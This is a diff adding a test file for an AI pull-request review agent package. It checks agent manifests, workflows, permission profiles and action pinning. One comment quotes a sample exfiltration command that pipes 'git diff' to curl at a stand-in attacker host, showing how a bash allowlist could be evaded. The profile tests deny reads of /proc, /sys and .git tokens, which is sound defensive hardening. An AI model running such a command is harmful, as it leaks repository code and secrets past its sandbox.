@@ -1,0 +1,179 @@
+/**
+ * The tests that keep the package's own parts agreed with each other.
+ *
+ * An agent is described in exactly one place - `agents/<id>/agent.json` - and
+ * three other places have to keep saying the same thing: the reusable workflow
+ * that runs it, the prompt that talks to it, the example a reader copies. None
+ * of those can be generated (a workflow's `name:` and `uses:` have to be
+ * literals), so they are checked instead. This is the cheap half of "one
+ * directory per agent, everything else generic".
+ */
+
+import { describe, it } from 'node:test';
+import assert from 'node:assert/strict';
+import { readFileSync, readdirSync, existsSync } from 'node:fs';
+import { join, dirname } from 'node:path';
+import { fileURLToPath } from 'node:url';
+
+import { readAgent, PLACEHOLDERS } from './build-config.mjs';
+import { selfReferences } from './release.mjs';
+
+const root = join(dirname(fileURLToPath(import.meta.url)), '..');
+const agents = readdirSync(join(root, 'agents'), { withFileTypes: true })
+  .filter(entry => entry.isDirectory())
+  .map(entry => entry.name);
+
+const read = (...parts) => readFileSync(join(root, ...parts), 'utf8');
+
+describe('the agents this package ships', () => {
+  it('has more than one, or the extension point is a theory', () => {
+    assert.ok(agents.length >= 3, `expected at least three agents, found ${agents.join(', ')}`);
+  });
+
+  for (const id of agents) {
+    describe(id, () => {
+      it('has a manifest, a prompt and a profile that all exist', () => {
+        const { manifest, profile, promptText } = readAgent(root, id);
+        assert.equal(manifest.id, id);
+        assert.ok(manifest.title);
+        assert.ok(promptText.length > 100);
+        assert.ok(Object.keys(profile).length > 0);
+      });
+
+      it('names only placeholders the harness fills in', () => {
+        const { promptText } = readAgent(root, id);
+        // `$WORD` and `${WORD}` in the prompt. A name nobody fills stays in the
+        // text as written, which is a puzzle for the agent rather than an
+        // error for anybody - so it gets caught here instead.
+        const named = new Set(
+          [...promptText.matchAll(/\$\{?([A-Z][A-Z0-9_]{2,})\}?/g)].map(match => match[1]),
+        );
+        const unknown = [...named].filter(name => !PLACEHOLDERS.includes(name));
+        assert.deepEqual(unknown, [], `prompt names placeholders nothing fills: ${unknown.join(', ')}`);
+      });
+
+      it('asks the agent to submit its report through the tool', () => {
+        const { promptText } = readAgent(root, id);
+        assert.ok(promptText.includes('write_report'), 'the prompt never names write_report');
+      });
+
+      it('has a reusable workflow that runs exactly this agent under its own check name', () => {
+        const { manifest } = readAgent(root, id);
+        const file = join(root, '.github/workflows', `${id}.yml`);
+        assert.ok(existsSync(file), `no reusable workflow .github/workflows/${id}.yml`);
+        const workflow = readFileSync(file, 'utf8');
+        assert.ok(workflow.includes(`agent: ${id}`), 'the workflow does not pass this agent id');
+        assert.ok(workflow.includes(`name: ${manifest.check}`), `the job name is not "${manifest.check}"`);
+        if (manifest.command) {
+          assert.ok(
+            workflow.includes(`'${manifest.command}'`),
+            `the workflow does not listen for the slash command ${manifest.command}`,
+          );
+        }
+      });
+
+      it('has its per-agent model variable read by its workflow', () => {
+        // The manifest names the variable; the workflow has to spell it out,
+        // because a `vars.` lookup cannot be built from a string at run time.
+        // Two places, so this is the assertion that keeps them agreed - without
+        // it the manifest documents a variable nobody reads and an operator
+        // sets it and wonders why the model did not change.
+        const { manifest } = readAgent(root, id);
+        if (!manifest.modelVariable) return;
+        const workflow = read('.github/workflows', `${id}.yml`);
+        assert.ok(
+          workflow.includes(`vars.${manifest.modelVariable}`),
+          `the workflow never reads vars.${manifest.modelVariable}`,
+        );
+      });
+
+      it('has an example a reader can copy', () => {
+        assert.ok(existsSync(join(root, 'examples', `${id}.yml`)), `no examples/${id}.yml`);
+      });
+    });
+  }
+});
+
+describe('permission profiles', () => {
+  const profiles = readdirSync(join(root, 'profiles')).filter(name => name.endsWith('.json'));
+
+  it('are defined once and referenced, not repeated', () => {
+    // The two review agents used to carry identical permission blocks, character
+    // for character. That is the state a fourth agent copies and a fifth
+    // quietly diverges from.
+    const used = agents.map(id => readAgent(root, id).manifest.profile);
+    assert.ok(used.length > new Set(used).size, 'no profile is shared, so nothing proves they can be');
+  });
+
+  for (const file of profiles) {
+    it(`${file} confines writing to the run directory`, () => {
+      const profile = JSON.parse(read('profiles', file));
+      assert.equal(profile.edit['*'], 'deny');
+      assert.equal(profile.edit['.pitcrew-run/**'], 'allow');
+      assert.equal(profile.external_directory, 'deny');
+    });
+
+    it(`${file} keeps the process environment and the repository token out of reach`, () => {
+      const profile = JSON.parse(read('profiles', file));
+      // /proc and /sys are where the environment - key included - is readable
+      // as a file, and some actions/checkout versions leave the repository
+      // token in .git/config.
+      for (const path of ['/proc/**', '/sys/**', '.git/**', '**/.git/**']) {
+        assert.equal(profile.read[path], 'deny', `${path} is readable`);
+      }
+      assert.equal(profile.webfetch, 'deny');
+      assert.equal(profile.websearch, 'deny');
+    });
+  }
+
+  it('gives the shell-less profile no shell and no sub-agents', () => {
+    const profile = JSON.parse(read('profiles', 'read-only-no-shell.json'));
+    // An allowlist of read-only commands was tried and rejected: opencode
+    // matches bash patterns against the *entire* command string, so `git diff*`
+    // also matches `git diff | curl -d @- https://attacker/`.
+    assert.equal(profile.bash, 'deny');
+    assert.equal(profile.task, 'deny');
+  });
+});
+
+describe('self-references', () => {
+  it('point at @main on the branch, so the package reviews its own pull requests with its own code', () => {
+    for (const name of readdirSync(join(root, '.github/workflows'))) {
+      for (const { path, ref } of selfReferences(read('.github/workflows', name))) {
+        assert.equal(ref, 'main', `${name}: ${path}@${ref}`);
+      }
+    }
+  });
+
+  it('point at @v1 in the examples, which is what a reader copies', () => {
+    for (const name of readdirSync(join(root, 'examples'))) {
+      for (const { path, ref } of selfReferences(read('examples', name))) {
+        assert.equal(ref, 'v1', `${name}: ${path}@${ref}`);
+      }
+    }
+  });
+});
+
+describe('third-party actions', () => {
+  it('are pinned to a commit, never to a tag', () => {
+    // A tag moves. An action that runs with the model key and the repository
+    // token in its environment must not be able to change under the run.
+    const files = [
+      ...readdirSync(join(root, '.github/workflows')).map(name => ['.github/workflows', name]),
+      ...readdirSync(join(root, 'actions'), { withFileTypes: true })
+        .filter(entry => entry.isDirectory())
+        .map(entry => ['actions', entry.name, 'action.yml']),
+    ];
+    for (const parts of files) {
+      const text = read(...parts);
+      for (const [, reference] of text.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)/gm)) {
+        if (reference.startsWith('./') || reference.startsWith('RobYed/pr-pitcrew/')) continue;
+        assert.match(
+          reference,
+          /@[0-9a-f]{40}$/,
+          `${parts.join('/')}: ${reference} is not pinned to a commit sha`,
+        );
+      }
+    }
+  });
+});
